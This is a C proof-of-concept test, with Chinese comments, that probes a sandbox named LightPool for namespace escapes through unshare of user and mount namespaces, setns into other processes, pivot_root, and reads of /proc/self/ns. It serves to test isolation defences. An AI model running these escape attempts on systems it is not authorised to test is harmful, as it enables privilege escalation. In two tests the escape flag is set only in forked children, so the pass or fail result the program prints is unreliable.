/*
 * POC-013: 命名空间逃逸与 setns 攻击
 *
 * 攻击技术：
 * - unshare 创建新命名空间后逃逸
 * - setns 加入其他进程的命名空间
 * - /proc/[pid]/ns/ 符号链接读取命名空间信息
 * - mount 命名空间逃逸（pivot_root）
 * - 网络命名空间逃逸（访问宿主机网络）
 * - user 命名空间提权（unshare -U 后获得 CAP_SYS_ADMIN）
 *
 * 预期行为：
 * - seccomp 拦截 unshare/setns/pivot_root
 * - user 命名空间被禁用（无 CAP_SYS_ADMIN）
 * - /proc/[pid]/ns/ 不可访问
 * - 进程被杀死
 *
 * 风险等级：Critical
 * 攻击面：LightPool namespace 隔离
 * 参考：CWE-863, CWE-269
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <errno.h>
#include <dirent.h>
#include <sys/wait.h>
#include <sys/syscall.h>

static int bypass_found = 0;

static void test_unshare_user(void) {
    printf("--- 测试1: unshare(CLONE_NEWUSER) 提权 ---\n");
    pid_t pid = fork();
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER) == 0) {
            printf("[!] unshare(CLONE_NEWUSER) 成功！(可能获得 CAP_SYS_ADMIN)\n");
            /* 检查是否有 CAP_SYS_ADMIN */
            if (unshare(CLONE_NEWNS) == 0) {
                printf("[!] 在 user namespace 中成功 unshare(CLONE_NEWNS)！\n");
                bypass_found = 1;
            }
            _exit(0);
        } else {
            printf("[+] unshare(CLONE_NEWUSER) 被拒绝 (errno=%d: %s)\n", errno, strerror(errno));
            _exit(0);
        }
    }
    int status;
    waitpid(pid, &status, 0);
}

static void test_setns_other(void) {
    printf("\n--- 测试2: setns 加入其他进程命名空间 ---\n");
    DIR *proc = opendir("/proc");
    if (proc) {
        struct dirent *entry;
        int tried = 0;
        while ((entry = readdir(proc)) != NULL && tried < 10) {
            if (entry->d_name[0] >= '1' && entry->d_name[0] <= '9') {
                pid_t other = atoi(entry->d_name);
                if (other != getpid()) {
                    char ns_path[128];
                    snprintf(ns_path, sizeof(ns_path), "/proc/%d/ns/mnt", other);
                    int fd = open(ns_path, O_RDONLY);
                    if (fd >= 0) {
                        if (setns(fd, CLONE_NEWNS) == 0) {
                            printf("[!] 成功 setns 到进程 %d 的 mount namespace！\n", other);
                            bypass_found = 1;
                        } else {
                            printf("[+] setns 被拒绝 (errno=%d)\n", errno);
                        }
                        close(fd);
                    }
                    tried++;
                }
            }
        }
        closedir(proc);
    }
}

static void test_pivot_root(void) {
    printf("\n--- 测试3: pivot_root 根目录切换 ---\n");
    pid_t pid = fork();
    if (pid == 0) {
        /* 尝试 pivot_root（需要 CAP_SYS_ADMIN） */
        if (mkdir("/tmp/newroot", 0755) == 0) {
            if (syscall(SYS_pivot_root, "/tmp/newroot", "/tmp/newroot/oldroot") == 0) {
                printf("[!] pivot_root 成功！(根目录切换逃逸)\n");
                bypass_found = 1;
                _exit(0);
            }
        }
        printf("[+] pivot_root 被拒绝 (errno=%d: %s)\n", errno, strerror(errno));
        _exit(0);
    }
    int status;
    waitpid(pid, &status, 0);
    rmdir("/tmp/newroot");
}

static void test_proc_ns_read(void) {
    printf("\n--- 测试4: /proc/self/ns/ 信息泄露 ---\n");
    const char *ns_types[] = {"mnt", "pid", "net", "user", "ipc", "uts"};
    for (int i = 0; i < 6; i++) {
        char path[128];
        snprintf(path, sizeof(path), "/proc/self/ns/%s", ns_types[i]);
        char target[256];
        ssize_t len = readlink(path, target, sizeof(target) - 1);
        if (len > 0) {
            target[len] = '\0';
            printf("[*] %s -> %s\n", path, target);
        } else {
            printf("[+] %s 读取被拒绝\n", path);
        }
    }
}

int main(void) {
    printf("[*] POC-013: 命名空间逃逸与 setns 攻击测试\n\n");
    test_unshare_user();
    test_setns_other();
    test_pivot_root();
    test_proc_ns_read();
    printf("\n");
    if (bypass_found) {
        printf("[!] 结果：发现命名空间逃逸漏洞！\n");
        return 2;
    }
    printf("[+] 结果：所有命名空间逃逸尝试均被阻止\n");
    return 0;
}
